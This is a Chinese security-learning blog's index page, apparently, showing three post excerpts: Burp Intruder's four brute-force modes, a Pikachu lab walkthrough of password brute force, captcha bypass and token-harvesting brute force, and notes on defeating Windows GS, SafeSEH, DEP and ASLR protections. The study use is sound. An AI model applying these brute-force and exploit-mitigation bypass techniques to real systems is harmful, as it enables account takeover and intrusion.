<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Sinky-wang</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Sinky-wang">
<meta property="og:url" content="https://sinky-wang.github.io/index.html">
<meta property="og:site_name" content="Sinky-wang">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Sinky-wang">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Sinky-wang" type="application/atom+xml">
  
  
    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
  
  
      
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
    <!--自定义看板娘-->
  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
  <script src="/live2d-widget/autoload.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>

<meta name="generator" content="Hexo 4.2.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="img/head.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sinky-wang</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="https://Sinky-wang.github.io">博客首页</a></li>
                        
                            <li><a  href="/archives">文章归档</a></li>
                        
                            <li><a  href="/CTFStudy">学习导航</a></li>
                        
                            <li><a  href="/PWNABLE">PWNABLE</a></li>
                        
                            <li><a  href="/resume">个人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail"  target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
                            
                                <a class="fl github"  target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
                            
                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/bp/" style="font-size: 10px;">bp</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://yunee.top/">yunee</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weik1.top/">weik1</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.abelche.com/">Abelche</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://prowes5.github.io">Prowers5</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sfishlost.com/">superfish</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://kirin-say.top/">Kirin</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://nobb.site/">Hcamael</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.giantbranch.cn/">giantbranch</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">总是找不到漏洞的二进制菜狗 微信：visionary243694 欢迎各位大佬指导</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Sinky-wang</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">Sinky-wang</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="https://Sinky-wang.github.io">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                    <li><a href="/CTFStudy">学习导航</a></li>
                
                    <li><a href="/PWNABLE">PWNABLE</a></li>
                
                    <li><a href="/resume">个人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-bp四种密码爆破模式学习" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/11/02/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/" class="article-date">
      <time datetime="2020-11-02T09:15:24.265Z" itemprop="datePublished">2020-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/02/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/">burp四种密码爆破模式学习</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <ul>
<li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li>
<li>Battering ram:多参数同时爆破，但用的是同一个字典</li>
<li>Pitchfork:多参数同时爆破，但用的是不同的字典</li>
<li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li>
</ul>
<h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p>
<p>一个参数a，若payload有x个，则执行x次。</p>
<p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p>
<ul>
<li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景<h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1>（payload一对多）</li>
</ul>
<p>一个参数a，若payload有x个，则执行x次。</p>
<p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p>
<ul>
<li>此模式主要适用于：撞库</li>
</ul>
<h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p>
<p>a:1,2</p>
<p>b:3,4</p>
<p>第一次爆破为 1，3</p>
<p>第二次爆破为 2，4</p>
<ul>
<li>此模式主要适用于：恶意注册<h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1>（多对多）</li>
</ul>
<p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bp/" rel="tag">bp</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-pikachu漏洞练习1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" class="article-date">
      <time datetime="2020-10-30T08:02:38.085Z" itemprop="datePublished">2020-10-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/">pikachu漏洞练习记录1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p>
<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p>
<p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p>
<h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p>
<p>查看源码，输入的验证码在本地验证：</p>
<p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p>
<p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p>
<h2 id="token放爆破？"><a href="#token放爆破？" class="headerlink" title="token放爆破？"></a>token放爆破？</h2><blockquote>
<p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p>
</blockquote>
<h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul>
<li>客户端使用用户名和密码请求登录</li>
<li>服务端收到请求去验证用户名和密码</li>
<li>验证成功后，服务端会签发一个token，再将token发送给客户端</li>
<li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li>
<li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li>
<li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li>
<li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li>
</ul>
<p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p>
<p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p>
<p>在测试器中，设置password和token两个变量，使用pitchfork。</p>
<p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p>
<p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p>
<p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p>
<p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p>
<p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p>
<p>开始攻击，根据不同length找出正确密码，爆破完成。</p>
<p>注：该方法着实鸡肋。</p>
<h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p>
<ul>
<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li>
<li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li>
</ul>
<h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2>
      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-类型漏洞合集" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" class="article-date">
      <time datetime="2020-10-16T04:29:57.589Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/">各类型软件漏洞合集</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="0x01-格式化串漏洞"><a href="#0x01-格式化串漏洞" class="headerlink" title="0x01 格式化串漏洞"></a>0x01 格式化串漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。</p>
<p>此类漏洞发生条件苛刻，实际案例很少。</p>
<h2 id="能够引起此漏洞的函数"><a href="#能够引起此漏洞的函数" class="headerlink" title="能够引起此漏洞的函数"></a>能够引起此漏洞的函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int printf(const char* format [,argument]...);</span><br><span class="line">int wprintf(const wchar_t* format [,argument]...);</span><br><span class="line">int fwprintf(FILE* stream,const wchar_t* format [,argument]...);</span><br><span class="line">int sprintf(char buffer,const char* format [,argument]...);</span><br><span class="line">int swprintf(wchar_t *buffer,const wchar_t *format [,argument]...);</span><br><span class="line">int vprintf(const char* format,va_list argptr );</span><br><span class="line">int vwprintf(const wchar_t* format,va_list argptr );</span><br><span class="line">int vfprintf(FILE *stream,const char* format,va_list argptr );</span><br><span class="line">int vfwprintf(FILE *stream,const wchar_t* format,va_list argptr );</span><br><span class="line">int vsprintf(char *buffer,const char* format,va_list argptr );</span><br><span class="line">int vswprintf(wchar_t *buffer,const wchar_t* format,va_list argptr );</span><br></pre></td></tr></table></figure>

<h1 id="0x02-GS安全编译选项保护"><a href="#0x02-GS安全编译选项保护" class="headerlink" title="0x02 GS安全编译选项保护"></a>0x02 GS安全编译选项保护</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。</p>
<h2 id="以下情况不会应用GS"><a href="#以下情况不会应用GS" class="headerlink" title="以下情况不会应用GS"></a>以下情况不会应用GS</h2><ul>
<li>函数不包含缓冲区</li>
<li>函数被定义为具有变量参数列表</li>
<li>函数使用无保护的关键字标记</li>
<li>函数在第一个语句中包含内嵌汇编代码</li>
<li>缓冲区不是8字节类型且大小不大于4个字节。</li>
</ul>
<h2 id="典型突破GS的方法"><a href="#典型突破GS的方法" class="headerlink" title="典型突破GS的方法"></a>典型突破GS的方法</h2><h3 id="利用未保护的内存"><a href="#利用未保护的内存" class="headerlink" title="利用未保护的内存"></a>利用未保护的内存</h3><p>为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。</p>
<blockquote>
<p>例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。</p>
</blockquote>
<figure class="highlight plain"><figcaption><span>eax,1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<h3 id="覆盖虚函数"><a href="#覆盖虚函数" class="headerlink" title="覆盖虚函数"></a>覆盖虚函数</h3><p>程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。</p>
<blockquote>
<p>例子：利用C++的虚函数来绕过GS机制。</p>
<blockquote>
<p>当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。<br>虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。</p>
</blockquote>
</blockquote>
<h3 id="攻击异常处理"><a href="#攻击异常处理" class="headerlink" title="攻击异常处理"></a>攻击异常处理</h3><p>GS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS.</p>
<p>通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。</p>
<h3 id="同时替换栈中和-data中的Cookie"><a href="#同时替换栈中和-data中的Cookie" class="headerlink" title="同时替换栈中和.data中的Cookie"></a>同时替换栈中和.data中的Cookie</h3><p>cookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。</p>
<blockquote>
<p>例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90.<br>接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。<br>布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址)</p>
</blockquote>
<h1 id="0x03-SafeSEH：对异常处理的保护机制"><a href="#0x03-SafeSEH：对异常处理的保护机制" class="headerlink" title="0x03 SafeSEH：对异常处理的保护机制"></a>0x03 SafeSEH：对异常处理的保护机制</h1><p>在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。</p>
<h2 id="校验流程"><a href="#校验流程" class="headerlink" title="校验流程"></a>校验流程</h2><p>异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下：</p>
<ul>
<li>检查异常处理链是否位于当前程序的栈中</li>
<li>异常处理指针是否指向当前程序栈中</li>
<li>调用函数RtlIsVaildHandler()对异常处理函数进行校验<ul>
<li>异常处理函数地址是否在加载模块的内存空间</li>
<li>判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败）</li>
<li>程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续</li>
<li>判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败）</li>
<li>判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功</li>
<li>判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功</li>
</ul>
</li>
</ul>
<blockquote>
<p>RtlIsVaildHandler()允许异常处理函数执行的情况：</p>
<blockquote>
<p>异常处理函数位于加载模块内存范围之外，DEP关闭<br>异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）.<br>异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。</p>
</blockquote>
</blockquote>
<h2 id="绕过SafeSEH（不考虑DEP影响）"><a href="#绕过SafeSEH（不考虑DEP影响）" class="headerlink" title="绕过SafeSEH（不考虑DEP影响）"></a>绕过SafeSEH（不考虑DEP影响）</h2><ul>
<li>攻击返回地址绕过。<ul>
<li>一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址</li>
</ul>
</li>
<li>利用虚函数绕过</li>
<li>从堆中绕过</li>
<li>利用未启用SafeSEH模块绕过</li>
<li>利用加载模块之外的地址绕过SafeSEH</li>
<li></li>
</ul>
<h1 id="0x04-DEP"><a href="#0x04-DEP" class="headerlink" title="0x04 DEP"></a>0x04 DEP</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。</p>
<p>DEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>DEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP.</p>
<p>软件DEP即SafeSEH，与CPU硬件无关。</p>
<p>硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD）</p>
<h2 id="攻击DEP方法"><a href="#攻击DEP方法" class="headerlink" title="攻击DEP方法"></a>攻击DEP方法</h2><h3 id="攻击未启用DEP程序"><a href="#攻击未启用DEP程序" class="headerlink" title="攻击未启用DEP程序"></a>攻击未启用DEP程序</h3><h3 id="利用Ret2Libc挑战DEP"><a href="#利用Ret2Libc挑战DEP" class="headerlink" title="利用Ret2Libc挑战DEP"></a>利用Ret2Libc挑战DEP</h3><p>ret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。</p>
<h4 id="三种相对有效的绕过DEP的exploit方法"><a href="#三种相对有效的绕过DEP的exploit方法" class="headerlink" title="三种相对有效的绕过DEP的exploit方法"></a>三种相对有效的绕过DEP的exploit方法</h4><ul>
<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行</li>
<li>通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行</li>
<li>通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行</li>
</ul>
<h3 id="利用可执行内存挑战DEP"><a href="#利用可执行内存挑战DEP" class="headerlink" title="利用可执行内存挑战DEP"></a>利用可执行内存挑战DEP</h3><p>有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。</p>
<h3 id="利用-NET挑战DEP"><a href="#利用-NET挑战DEP" class="headerlink" title="利用.NET挑战DEP"></a>利用.NET挑战DEP</h3><p>.NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。</p>
<h3 id="利用java-applet挑战DEP"><a href="#利用java-applet挑战DEP" class="headerlink" title="利用java applet挑战DEP"></a>利用java applet挑战DEP</h3><p>java applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。</p>
<h1 id="0x05-ASLR"><a href="#0x05-ASLR" class="headerlink" title="0x05 ASLR"></a>0x05 ASLR</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>ASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。</p>
<p>（支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了）</p>
